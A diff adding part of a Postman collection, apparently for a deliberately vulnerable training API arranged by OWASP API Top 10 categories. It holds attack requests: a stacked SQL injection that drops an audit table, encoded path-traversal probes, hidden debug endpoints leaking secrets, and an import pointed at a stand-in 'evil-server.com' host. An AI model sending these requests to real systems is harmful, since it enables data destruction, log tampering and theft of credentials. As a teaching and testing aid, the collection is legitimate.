+						"description": "**Vulnerability:** Path traversal in download endpoint\n\n**Impact:** Download any file from server"
+					},
+					"response": []
+				},
+				{
+					"name": "SQL Injection via admin query",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"query\": \"SELECT * FROM users; DROP TABLE audit_logs;--\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/admin/database/query",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "database", "query"]
+						},
+						"description": "**Vulnerability:** Raw SQL execution\n\n**Impact:** Data theft, data destruction, database takeover"
+					},
+					"response": []
+				},
+				{
+					"name": "Database info disclosure",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/test-db",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "test-db"]
+						},
+						"description": "**Vulnerability:** Database connection info exposed\n\n**Impact:** Database URI, table names revealed"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API9 - Improper Inventory Management",
+			"description": "Demonstrates hidden/undocumented endpoints and improper API versioning.",
+			"item": [
+				{
+					"name": "Discover all routes",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/routes",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "routes"]
+						},
+						"description": "**Vulnerability:** Debug endpoint exposes all routes including hidden ones\n\n**Impact:** API inventory disclosure"
+					},
+					"response": []
+				},
+				{
+					"name": "Hidden endpoint - secrets",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/.hidden",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", ".hidden"]
+						},
+						"description": "**Vulnerability:** Hidden debug endpoint with secrets\n\n**Impact:** Admin password, API keys exposed"
+					},
+					"response": []
+				},
+				{
+					"name": "Hidden admin debug endpoint",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/admin/hidden/debug",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "hidden", "debug"]
+						},
+						"description": "**Vulnerability:** Undocumented admin endpoint exposes secrets\n\n**Impact:** JWT secret, debug config exposed"
+					},
+					"response": []
+				},
+				{
+					"name": "Hidden admin users list",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/admin/hidden/users",
+							"host": ["{{base_url}}"],
+							"path": ["api", "admin", "hidden", "users"]
+						},
+						"description": "**Vulnerability:** Undocumented endpoint returns user data\n\n**Impact:** Data exposure via hidden endpoint"
+					},
+					"response": []
+				},
+				{
+					"name": "Undocumented order statistics",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/orders/statistics",
+							"host": ["{{base_url}}"],
+							"path": ["api", "orders", "statistics"]
+						},
+						"description": "**Vulnerability:** Undocumented endpoint exposes business metrics\n\n**Impact:** Revenue, profit data exposed"
+					},
+					"response": []
+				},
+				{
+					"name": "Undocumented coupon list",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/products/coupons",
+							"host": ["{{base_url}}"],
+							"path": ["api", "products", "coupons"]
+						},
+						"description": "**Vulnerability:** Undocumented endpoint reveals all coupons\n\n**Impact:** Internal coupon codes exposed"
+					},
+					"response": []
+				},
+				{
+					"name": "Path confusion endpoint",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "{{base_url}}/api/debug/..%2f..%2f",
+							"host": ["{{base_url}}"],
+							"path": ["api", "debug", "..%2f..%2f"]
+						},
+						"description": "**Vulnerability:** Hidden endpoint using path encoding\n\n**Impact:** Secret endpoint discovery"
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "API10 - Unsafe Consumption of APIs",
+			"description": "Demonstrates unsafe consumption of external/third-party API data.",
+			"item": [
+				{
+					"name": "Import malicious external data",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer {{token}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"api_url\": \"http://evil-server.com/malicious-data.json\"\n}"
+						},
+						"url": {
+							"raw": "{{base_url}}/api/files/import-data",
+							"host": ["{{base_url}}"],
+							"path": ["api", "files", "import-data"]
+						},
+						"description": "**Vulnerability:** External API data imported without validation\n\n**Impact:** Malicious data injection, stored XSS, data corruption"
+					},
+					"response": []
+				}
+			]
+		}
+	]
+}
